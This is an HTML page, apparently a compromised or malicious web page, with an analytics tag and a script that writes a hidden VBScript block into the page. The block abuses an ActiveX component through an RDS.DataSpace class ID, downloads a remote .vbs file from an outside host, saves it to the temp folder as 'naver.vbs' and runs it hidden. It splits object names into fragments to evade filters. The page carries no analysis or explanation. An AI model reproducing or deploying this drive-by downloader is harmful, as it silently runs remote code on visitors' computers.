  <html>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-1416442-3";
urchinTracker();
</script>
  <SCRIPT>document.write(unescape("%0D%0A%20%20%3Cscript%20language=%22VBScript%22%3E%0D%0A%20%20on%20error%20resume%20next%0D%0A%20%20"))</SCRIPT>
  dl = "http://www.gmg.net/zz/vbs.vbs"
  Set df = document.createElement("object")
  df.setAttribute "clas"&"sid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
  str="Microsoft.XMLHTTP"
  Set x = df.CreateObject(str,"")
  a1="Ado"
  a2="db."
  a3="Str"
  a4="eam"
  str1=a1&a2&a3&a4
  str5=str1
  a5="Shell."
  a6="Application"
  a7=a5&a6
  a8=a7
  set S = df.createobject(str5,"")
  S.type = 1
  str6="GET"
  x.Open str6, dl, False
  x.Send
  fname1="naver.vbs"
  set F = df.createobject("Scripting.FileSystemObject","")
  set tmp = F.GetSpecialFolder(2)
  S.open
  fname1= F.BuildPath(tmp,fname1)   
  S.write x.responseBody
  S.savetofile fname1,2
  set Q = df.createobject(a8,"")
  S.close
  Q.ShellExecute fname1,"","","open",0
  </script>
  <script type="text/jscript">function init() {document.write(Date());}window.onload = init;</script>
  </html>












